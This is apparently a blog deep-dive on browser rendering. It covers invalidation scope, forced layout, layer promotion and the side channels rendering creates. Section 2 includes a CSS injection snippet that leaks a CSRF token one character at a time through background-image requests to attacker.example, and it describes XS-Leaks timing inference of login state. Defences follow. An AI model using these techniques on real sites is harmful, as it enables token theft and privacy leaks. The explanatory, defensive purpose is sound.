Invalidation scope is the spot Part 9 §1 folded into a line. This follows, stage by stage, which stage one changed value makes run again, and how far that difference leaks outward. **What decides cost is not the amount of computation but the number of stages that run again, and that number can be counted from outside.**

![Pipeline invalidation scope](/images/net-browser/deep-02-pipeline.svg)

---

## 1. Invalidation scope

The frame budget is about 16.7 ms at 60 Hz. JavaScript execution, style computation, layout, paint and compositing all have to fit inside it. Performance problems are therefore decided less by "how fast the code is" than by **which stage the work restarts from**.

| What you change | Style | Layout | Paint | Composite |
|---|---|---|---|---|
| `width`, `height`, `font-size`, `display` | rerun | rerun | rerun | rerun |
| `color`, `background-color`, `box-shadow` | rerun | skipped | rerun | rerun |
| `transform`, `opacity` (promoted layer) | skipped | skipped | skipped | rerun |

The third row is the basis of the advice to use `transform` for animation. Only the placement of an already-rasterized layer changes, so the main thread is barely involved. It is also why animations keep running on the compositor thread even when the main thread is blocked by JavaScript.

### The exact condition for forced synchronous layout

To make Part 9 §2's point a little more exact, what forces layout is **the act of reading a value that depends on layout results**. `offsetTop`, `offsetWidth`, `getBoundingClientRect()`, `scrollTop` and some properties of `getComputedStyle()` fall under this.

```js
// bad – alternating writes and reads runs layout as many times as the loop iterates
for (const el of items) {
  el.style.width = el.offsetWidth + 10 + 'px';
}

// good – gather the reads first, then batch the writes
const widths = items.map(el => el.offsetWidth);   // layout once
items.forEach((el, i) => el.style.width = widths[i] + 10 + 'px');
```

This separation is what a framework's DOM batching does. Even using a library, wedging code that reads geometric values directly in between makes the effect disappear.

### The price of layer promotion

Promote an element to its own layer and it is rasterized independently, so moving it requires only recompositing. Hence the widely used technique of attaching `will-change` or `transform: translateZ(0)` to induce promotion.

The price is memory and compositing cost.

- Each layer uses its own GPU memory. Dozens of screen-sized layers is a substantial amount.
- As layer count grows, the compositing stage itself becomes the bottleneck. Because there are more layers to handle each frame.
- Scatter `will-change` globally across the stylesheet and it occupies that memory the whole time the page is open.

The principle is **turn it on only while it is needed and off when it ends**. Set it right before the animation starts and remove it after it completes.

### Declarations that narrow invalidation scope

By default, one element's size change propagates to siblings and ancestors. The browser cannot know how far the effect reaches, so it conservatively recomputes widely.

`contain` lets the developer **declare** that scope. Promise "changes inside this element do not affect the outside" and the browser believes that promise and confines recomputation inside the subtree. If the promise is false, rendering breaks – so this is a performance optimization and at the same time **a contract the developer carries**.

`content-visibility: auto` goes further and skips rendering of off-screen content entirely. The effect is large on long lists. But this feature touches directly on the information channels that follow. Because **making the difference in render cost large** also means that difference becomes easier to observe.

In Part 15's classification, the cell this instalment stands in is D (side-effect observation).

---

## 2. The information channels rendering creates

This unfolds what Part 9 mentioned briefly. The core is that these are **byproducts of features, not bugs**.

### Extracting values with CSS alone

Values can be extracted even in a situation where no script can be inserted and only style can be injected.

```css
input[name="csrf"][value^="a"] { background: url(https://attacker.example/?a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.example/?b); }
/* … for every character */
```

Attribute selectors match only when they match the value's prefix, and only matched rules request a background image. The attacker settles the first character by which request arrived, then continues at the next step with `value^="aa"`, `value^="ab"` and so on. As many rules as the character set size are needed per character, but the whole search is **linear in the number of characters**. The same structure as Part 7's CRIME. When a partial match is observable, an exponential search becomes linear.

Using `@import` to load each step sequentially lets several rounds be chained from a single injection. The defence is twofold. Restrict external resource loading with CSP, and do not keep sensitive values in DOM attributes (deliver the token in a script variable or a header rather than in `value`).

### Inferring state from differences in render cost

Put another origin's page in a frame and its content cannot be read (Part 10). But **how long it takes to draw** can be observed.

Suppose a page shows a long list to a logged-in user and a login form otherwise. If the render cost differs between the two cases, the side that attached the frame can learn whether the victim is logged in just by measuring that difference. Whether search results exist, and access rights to a particular resource, are inferred the same way.

This class is called XS-Leaks, and there are observable signals besides render time: frame count, whether scrolling is possible, whether an image loaded, whether a resource is in the cache. That browsers partitioned cache and storage per site (Part 10) was a measure to close the cache-based path among these.

---

## 3. Defences and their limits

Blocking reads and removing differences in response are different jobs. Selectors have to match, and rendering costs differ according to content. Differences cannot be made zero while keeping the features.

So defences in practice take the form of stacking layers.

- Refuse framing itself with `frame-ancestors`. The most direct way of removing the observation point.
- Cut the coupling with other origins using `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy`.
- Keep authentication state off cross-site requests with `SameSite` cookies. The state difference itself disappears.
- Make the responses of sensitive judgements uniform in form. This includes matching status codes and response sizes.

The last item works on the same principle as Part 5's padding oracle defence. The fundamental thing is **not making differences unobservable but designing so that differences do not arise**.

---

## Where to go back to

The places to go back to are [Part 9 §1](/post/net-browser-09-rendering-engine), which set up the pipeline stages, and §6 of the same instalment, which organized where vulnerabilities live at that layer.

To see the same archetype D at the data layer, go to [Deep Dive 03](/post/net-browser-deep-03-database), where index structure reveals itself through time differences.

The boundary-discrepancy archetype is handled by [Deep Dive 01](/post/net-browser-deep-01-desync), which dissects desync variant by variant.

---

### References

- [RenderingNG deep-dive: BlinkNG](https://developer.chrome.com/docs/chromium/blinkng) – the background to separating pipeline stages
- [XS-Leaks Wiki](https://xsleaks.dev/) – a list of observation channels and defences
- [CSS Containment](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_containment) – MDN
